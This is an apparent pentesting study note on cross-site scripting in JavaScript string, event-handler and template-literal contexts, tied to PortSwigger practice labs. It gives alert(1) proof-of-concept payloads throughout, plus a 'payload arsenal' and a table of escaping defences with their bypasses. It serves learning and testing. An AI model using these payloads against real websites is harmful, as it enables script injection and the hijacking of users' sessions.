# XSS - JavaScript string and template literal context

Input is reflected inside an existing JavaScript string literal, event handler attribute, or template literal. Breaking out requires different escapes depending on which characters the app encodes or escapes.

## Quick reference
```
# Basic JS string (nothing escaped)
';alert(1)//

# ' is backslash-escaped; \ is not - inject \ to neutralize the app's escape
\';alert(1)//
# app writes: var x = '\'<- your \';alert(1)//'; -> \' = literal backslash + unterminated ', closes with //

# Both ' and \ are escaped - use HTML parser to close script block
</script><script>alert(1)</script>

# onclick / event handler attribute - HTML entities decoded before JS
http://foo?&apos;-alert(1)-&apos;

# Template literal (${} executes regardless of other escaping)
${alert(1)}
```

## Root cause
The app inserts user input directly into a JavaScript string literal without JS-escaping it. HTML-encoding alone is insufficient in a JS context because the JS parser processes `\`, `'`, `"`, `;` differently from HTML. Template literals add a second execution path via `${}` that bypasses string escaping entirely.

## Find it
1. Submit a unique string, view source, locate it inside `<script>...</script>` or an event handler attribute.
2. Identify the enclosing string delimiter: `'`, `"`, or backtick.
3. Test: does `'` appear literally in the output? If not, it's being escaped. Does `\` appear literally? If not, both are escaped.
4. If inside a template literal (backticks), try `${alert(1)}` immediately.
5. If in an event handler attribute (onclick, onmouseover), try `&apos;` for single quote.

## Technique
**Case 1 - nothing escaped:** `';alert(1)//`
- `'` breaks out of the string; `alert(1)` runs; `//` comments out the rest of the line.

**Case 2 - `'` escaped to `\'` and `\` escaped to `\\`:**
- Standard string break-out fails. But the HTML parser closes `</script>` before the JS parser sees the backslash:
- Payload: `</script><script>alert(1)</script>`
- The browser's HTML tokenizer sees `</script>` and closes the script block, ignoring the JS context. Then `<script>alert(1)</script>` executes.

**Case 3 - `'` escaped but `\` NOT escaped:**
- The app turns `'` into `\'`. Inject `\` before your `'` to escape the escape:
- Payload: `\';alert(1)//`
- App writes: `var x = '\\';alert(1)//';` -> the `\\` is a literal backslash (not an escape), the `'` terminates the string, `alert(1)` executes.

**Case 4 - onclick event handler (HTML entities in attributes):**
- Input in `onclick="var x = 'WEBSITE'"`. All of `'`, `\`, `"`, `<>` escaped.
- HTML entities work: `&apos;` is decoded by the HTML parser before JS sees the attribute:
- Payload for website field: `http://foo?&apos;-alert(1)-&apos;`
- onclick value becomes: `onclick="var x = 'http://foo?'-alert(1)-'';"` -> closes string, runs alert.

**Case 5 - template literal:**
- Input inside `\`...\``. Even with backtick and `\` escaped, `${}` is processed:
- Payload: `${alert(1)}`
- Template literal executes the expression immediately.

## Payload arsenal
```javascript
// Case 1: nothing escaped
';alert(1)//
"-alert(1)-"

// Case 2: both escaped -> close script block via HTML parser
</script><script>alert(1)</script>

// Case 3: ' escaped, \ not
\';alert(1)//

// Case 4: event handler - HTML entities
http://foo?&apos;-alert(1)-&apos;
# full URL format for website field
http://foo?'-alert(1)-'     (unescaped, if server doesn't encode &apos; variant)

// Case 5: template literal
${alert(1)}
${alert`1`}
```

## Bypasses
| Defense | Bypass |
|---|---|
| `'` -> `\'` | Use `\';` to escape the escape (if `\` not escaped) |
| Both `'` and `\` escaped | Close with `</script>` (HTML parser wins over JS parser) |
| Angle brackets encoded | Use `&apos;` HTML entity in event handler context |
| Backtick and `\` escaped | `${alert(1)}` in template literal - no escaping of `${` |

## Exploitation walkthrough
**Lab 1 (angle brackets encoded, `'` not):** view source - string context with `'`; payload `';alert(1)//` -> alert.

**Lab 2 (`'` and `\` both escaped):** `</script><script>alert(1)</script>` -> HTML parser terminates script block; new `<script>` fires.

**Lab 3 (`'` escaped, `\` not):** payload `\';alert(1)//` -> `\\';alert(1)//` in source -> `\\` is literal backslash, `'` closes string.

**Lab 4 (onclick, all escaped):** comment website field `http://foo?&apos;-alert(1)-&apos;` -> onclick decoded by HTML parser -> `'` closes JS string -> alert.

**Lab 5 (template literal):** submit `${alert(1)}` -> executes inside backtick template.

## Chaining
- JS context XSS -> [Exploiting-XSS](../Exploiting-XSS/) (same weaponization applies once you have execution)
- Closing a script block (`</script>`) is a technique shared with [HTTP-request-smuggling](../../HTTP-request-smuggling/) (script injection via smuggled response)

## Tools
- **Burp Repeater** - test each payload variant, observe JS context
- **View source** - count quote characters and escapes around your input

## Labs

### Reflected XSS into a JavaScript string with angle brackets HTML encoded [Apprentice]
Input in JS string; `<>` encoded but `'` not. `';alert(1)//` terminates string and runs alert. Key insight: breaking out of a JS string only needs the string delimiter, not angle brackets.

### Reflected XSS into a JavaScript string with single quote and backslash escaped [Practitioner]
Both `'` and `\` escaped. Use `</script><script>alert(1)</script>` - HTML parser closes block before JS parser processes escapes. Key insight: HTML parsing happens before JS parsing; `</script>` always ends a script block.

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped [Practitioner]
`'` escaped, `\` not. Payload `\';alert(1)//` - inject `\` to neutralize the added backslash, freeing the `'`. Key insight: `\` escaping the escape character is a common bypass.

### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped [Practitioner]
Website URL stored in onclick attribute. All escape chars blocked. Use HTML entity `&apos;` (decoded by HTML parser, not blocked by JS escaping): `http://foo?&apos;-alert(1)-&apos;`. Key insight: HTML entities are decoded before the JS parser sees the attribute value.

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped [Practitioner]
Input inside JS template literal. All typical escape chars blocked. `${alert(1)}` - template expression syntax is not affected by string escaping. Key insight: `${}` inside a template literal is always evaluated, regardless of surrounding escaping.

## Real-world notes
- The `</script>` technique works even when the JS context has strict escaping, because browser HTML tokenizers are deliberately forgiving.
- Template literal injections are increasingly common in modern JS frameworks that dynamically construct JS strings with backticks.
- In real SPAs, look for eval(), setTimeout(), setInterval() with user-controlled data - they're JS context sinks even if no `<script>` tag is visible.

## References
- https://portswigger.net/web-security/cross-site-scripting/contexts
